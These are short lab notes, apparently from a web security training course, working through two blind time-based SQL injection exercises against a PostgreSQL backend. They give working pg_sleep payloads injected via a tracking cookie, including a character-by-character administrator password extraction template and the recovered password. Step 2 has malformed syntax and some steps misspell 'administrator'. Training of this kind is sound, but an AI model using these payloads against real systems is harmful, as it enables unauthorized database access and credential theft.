# Lab: Blind SQL injection with time delays

```sql
TrackingId=38zUDWnGufT7WaQl'||pg_sleep(10)--
```

pg_sleep is used becuase of postgres data base
[[portswigger_wsa/sql_cheet_sheet)

# Lab: Blind SQL injection with time delays and information retrieval

### step1

```sql
TrackingId=38zUDWnGufT7WaQl'||pg_sleep(10)--
```

took 10 second
-> output -> true

### step2

```sql
TrackingId=38zUDWnGufT7WaQl'||(SELECT WHEN CASE (1=2)) THEN pg_sleep(10) ELSE pg_sleep(-1) END)--
```

it will execute in few seconds

### step3

change case value

```SQL
TrackingId=38zUDWnGufT7WaQl'||(SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END)--
```

### step4

```sql
TrackingId=38zUDWnGufT7WaQl'||(SELECT CASE WHEN (username='adminstrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users)--
```

### step5

```sql
TrackingId=38zUDWnGufT7WaQl'||(SELECT CASE WHEN (username='administrator' AND LENGTH(password)>1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users)--
```

or(both is correct below is url encode)

```sql
'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

### step6

```sql
TrackingId=38zUDWnGufT7WaQl'||(SELECT CASE WHEN (username='adminstrator' AND SUBSTRING(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users)--
```

### step7

```sql
TrackingId=CEcXYgMnxua7ak2P'||(SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,§1§,1)='§a§') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users)--
```

or

```sql
'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,§1§,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

```
1  2  3  4  5  6  7  8  9  10  11  12  13  14  15  16  17  18  19  20
7  0  a  5  f  o  l  c  j   j  q   y   s   j    j  e   u   o   1   0
70a5folcjjqysjjeuo10
```

![screenshot](./images/time_delay.png)
